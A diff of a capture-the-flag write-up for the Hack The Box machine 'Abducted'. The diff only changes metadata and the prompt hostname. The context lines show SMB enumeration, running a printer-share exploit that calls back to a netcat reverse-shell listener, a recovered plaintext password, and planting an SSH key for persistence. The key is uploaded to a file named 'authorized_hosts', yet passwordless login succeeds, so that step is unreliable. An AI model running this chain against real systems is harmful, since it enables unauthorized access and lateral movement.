@@ -1,6 +1,7 @@
 +++
 title = "Abducted - Small printer misconfiguration gets machine pwned"
 date = 2026-06-15T01:38:45Z
+difficulty = "medium"
 tags = ["HTB - Medium", "Linux", "Pentesting"]
 description = "Pwning the Abducted machine from HTB."
 +++
@@ -9,7 +10,7 @@ description = "Pwning the Abducted machine from HTB."
 ## **RECON**
 After obtaining the target machine's IP address, I ran an nmap scan to identify open TCP ports:
 ```bash
-┌──(root㉿kali)-[/home/esteban/HackTheBox]
+┌──(root㉿pangelinan)-[~/HackTheBox]
 └─# nmap -sS -oN nmap_scan.txt 10.129.27.170 --min-rate=10000            
 ```
 The scan revealed three open TCP ports, one for SSH and two for Samba SMB:
@@ -62,7 +63,7 @@ With this port scan, I only saw two points of entry: **ssh** and **smb**.
 ## **ENUMERATION**
 I went ahead and ran the **enum4linux** tool against the target machine's IP to enumerate SMB shares and users:
 ```bash
-┌──(root㉿kali)-[/home/esteban/HackTheBox]
+┌──(root㉿pangelinan)-[~/HackTheBox]
 └─# enum4linux 10.129.27.170
 Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Jun 15 12:16:26 2026
 
@@ -253,7 +254,7 @@ For the **scott** user, I went ahead and let my brute-force attempt run for abou
 &nbsp;  
 Instead of focusing on the two **disk** shares (**projects** and **transfer**), I took a look into the **printer** share, **HP-Reception**. I accessed it using **marcus**'s guest account:  
 ```bash
-┌──(root㉿kali)-[/home/esteban/HackTheBox]
+┌──(root㉿pangelinan)-[~/HackTheBox]
 └─# smbclient //10.129.27.170/HP-Reception -U marcus%       
 Try "help" to get a list of possible commands.
 smb: \> 
@@ -269,13 +270,13 @@ A PoC has already been created for this vulnerability, which already comes confi
 I went ahead and downloaded the exploit, installed the dependencies required, set up a listener, and ran it on my attacker machine:
 ```bash
 # Setting up a listener
-┌──(root㉿kali)-[/home/esteban/HackTheBox]
+┌──(root㉿pangelinan)-[~/HackTheBox]
 └─# nc -lvnp 4444
 listening on [any] 4444 ...
 ```
 ```bash
 # Running the exploit
-┌──(root㉿kali)-[/home/esteban/HackTheBox]
+┌──(root㉿pangelinan)-[~/HackTheBox]
 └─# python3 exploit.py 10.129.27.170 10.10.16.192 4444
 [*] target   : 10.129.27.170 (\\10.129.27.170\HP-Reception)
 [*] callback : 10.10.16.192:4444  (start a listener first: nc -lvnp 4444)
@@ -285,7 +286,7 @@ Now, just gotta check our listener to see if we got a-
 ## **FOOTHOLD**
 ```bash
 # Success! Shell has been caught
-┌──(root㉿kali)-[/home/esteban/HackTheBox]
+┌──(root㉿pangelinan)-[~/HackTheBox]
 └─# nc -lvnp 4444
 listening on [any] 4444 ...
 connect to [10.10.16.192] from (UNKNOWN) [10.129.27.170] 52264
@@ -332,7 +333,7 @@ iXzvcib3SrpZ
 ```
 Boom. We found what we were looking for, a **password**! I went ahead and tried it with both **marcus** and **scott**, and was able to use it to SSH into **scott**'s account:
 ```bash
-┌──(root㉿kali)-[/home/esteban/HackTheBox]
+┌──(root㉿pangelinan)-[~/HackTheBox]
 └─# ssh scott@10.129.27.170                           
 scott@10.129.27.170's password: 
 scott@abducted:~$ 
@@ -418,7 +419,7 @@ marcus_home
 ```
 Link created. All I had to do now was open another terminal on my attacker machine and use **smbclient** to open it up:  
 ```bash
-┌──(root㉿kali)-[/home/esteban/HackTheBox]
+┌──(root㉿pangelinan)-[~/HackTheBox]
 └─# smbclient //10.129.27.170/transfer -U scott%iXzvcib3SrpZ
 Try "help" to get a list of possible commands.
 smb: \> dir
@@ -450,7 +451,7 @@ putting file /root/.ssh/id_rsa.pub as \marcus_home\.ssh\authorized_hosts (1.3 kB
 ```
 Now, I was able to **ssh** into the machine as **marcus** with no password necessary:
 ```bash
-┌──(root㉿kali)-[/home/esteban/HackTheBox]
+┌──(root㉿pangelinan)-[~/HackTheBox]
 └─# ssh marcus@10.129.27.170
 marcus@abducted:~$ 
 ```
